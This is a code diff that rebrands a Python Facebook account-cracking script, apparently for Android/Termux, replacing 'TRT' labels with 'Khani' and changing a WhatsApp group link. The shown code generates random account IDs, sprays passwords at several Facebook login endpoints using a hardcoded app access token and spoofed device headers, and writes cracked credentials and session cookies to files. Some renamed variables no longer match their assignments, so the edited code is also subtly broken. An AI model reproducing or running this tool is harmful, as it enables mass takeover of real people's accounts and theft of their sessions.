@@ -287,7 +287,7 @@ def menu():
 				#dz._login()
 				exit()
 			elif xd in ['4','04']:
-				os.system('xdg-open https://chat.whatsapp.com/GRCLEUOREdd1SDMTX1TsKk')
+				os.system('xdg-open https://chat.whatsapp.com/EQmI7aMl6af2zIXbUCUGs3')
 				menu()
 			elif xd in ['0','00']:
 				exit(' Thanks for use 🥰 ')
@@ -314,7 +314,7 @@ def pak():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=30) as TRT:	
+		with tred(max_workers=30) as Khani:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -510,14 +510,14 @@ def api1(ids,names,passlist):
 				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 				q = json.loads(po)
 				if 'session_key' in q:
-					print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\033[1;32m [Khani-OK] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
+						print('\r\r\x1b[38;5;205m [Khani-CP] '+ids+' | '+pas+'\033[1;97m')
+						open('/sdcard/khani-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
 					else:
@@ -583,26 +583,26 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [Khani-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/Khani-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/Khani-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[Khani-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [Khani-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Khani-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/Khani-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -614,7 +614,7 @@ def api2(ids,names,passlist):
 def api3(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [Khani-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -682,26 +682,26 @@ def api3(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [Khani-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/Khani-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/Khani-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[Khani-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [Khani-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Khani-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/Khani-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -714,7 +714,7 @@ def api3(ids,names,passlist):
 def api4(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [Khani-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -783,19 +783,19 @@ def api4(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [Khani-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Khani-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[Khani-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;206m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;206m [Khani-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Khani-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
@@ -811,7 +811,7 @@ def api4(ids,names,passlist):
 def api5(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [TRT-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [Khani-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -899,26 +899,26 @@ def api5(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [Khani-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/Khani-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/Khani-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[Khani-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [Khani-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Khani-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/Khani-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -949,14 +949,14 @@ def api6(ids,names,passlist):
 			if "c_user" in TRT:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
-				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [Khani-OK] %s | %s'%(ids,pas))
+				open('/sdcard/Khani-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in TRT:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [Khani-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/Khani-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -970,7 +970,7 @@ def api6(ids,names,passlist):
 #d.fb
 def api7(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [TRT-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [Khani-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -988,17 +988,17 @@ def api7(ids,names,passlist):
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			TRT=session.cookies.get_dict().keys()
-			if "c_user" in TRT:
+			if "c_user" in Khani:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
-				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [Khani-OK] %s | %s'%(ids,pas))
+				open('/sdcard/Khani-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in TRT:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [Khani-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/Khani-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1011,7 +1011,7 @@ def api7(ids,names,passlist):
 #method7
 def api8(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [TRT-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [Khani-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1029,17 +1029,17 @@ def api8(ids,names,passlist):
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			TRT=session.cookies.get_dict().keys()
-			if "c_user" in TRT:
+			if "c_user" in Khani:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
-				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [Khani-OK] %s | %s'%(ids,pas))
+				open('/sdcard/Khani-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in TRT:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [Khani-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/Khani-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1053,7 +1053,7 @@ def api8(ids,names,passlist):
 def trt1(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [Khani-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1137,8 +1137,8 @@ def trt1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [Khani-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Khani-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1148,8 +1148,8 @@ def trt1(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [Khani-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Khani-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1162,7 +1162,7 @@ def trt2(ids,passlist):
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [Khani-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
 			application_version_code=str(random.randint(000000000,999999999))
 			__iam_genius = random.choice(android_models)
@@ -1218,13 +1218,13 @@ def trt2(ids,passlist):
 			q = json.loads(po)
 			if 'session_key' in q:
 				udx = str(q['uid'])
-				print('\r\r\033[1;32m [TRT-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/TRT-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				print('\r\r\033[1;32m [Khani-OK] '+udx+' | '+pas+'\033[1;97m')
+				open('/sdcard/Khani-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/TRT-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
+				print('\r\r\x1b[38;5;205m [Khani-CP] '+ids+' | '+pas+'\033[1;97m')
+				open('/sdcard/Khani-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -1239,7 +1239,7 @@ def trt2(ids,passlist):
 def trt3(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [Khani-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1312,11 +1312,11 @@ def trt3(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [Khani-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         #open('/sdcard/TRT-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/Khani-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1326,8 +1326,8 @@ def trt3(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [Khani-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Khani-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1338,7 +1338,7 @@ def trt3(ids,passlist):
 def trt4(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [Khani-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1407,11 +1407,11 @@ def trt4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [Khani-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/Khani-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/Khani-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1421,8 +1421,8 @@ def trt4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [Khani-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Khani-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1502,8 +1502,8 @@ def trt5(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [Khani-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Khani-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1513,8 +1513,8 @@ def trt5(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [Khani-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Khani-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1527,7 +1527,7 @@ def trt6(ids,passlist):
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [Khani-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -1568,9 +1568,9 @@ def trt6(ids,passlist):
 				if uid in oks:pass
 				else:
 					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [TRT-2F] '+uid+' | '+pas)
+						print('\r\r\033[1;34m [Khani-2F] '+uid+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [TRT-OK] '+uid+' | '+pas)
+						print(f'\r\x1b[1;32m [Khani-OK] '+uid+' | '+pas)
 						open('/sdcard/TRT-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
 						oks.append(uid)
 						break
@@ -1579,8 +1579,8 @@ def trt6(ids,passlist):
 				uid=coki[141:156]
 				if uid in cps:pass
 				else:
-					print('\r\r\x1b[38;5;205m [TRT-CP] '+uid+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [Khani-CP] '+uid+' | '+pas+'\033[1;97m')
+					open('/sdcard/Khani-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
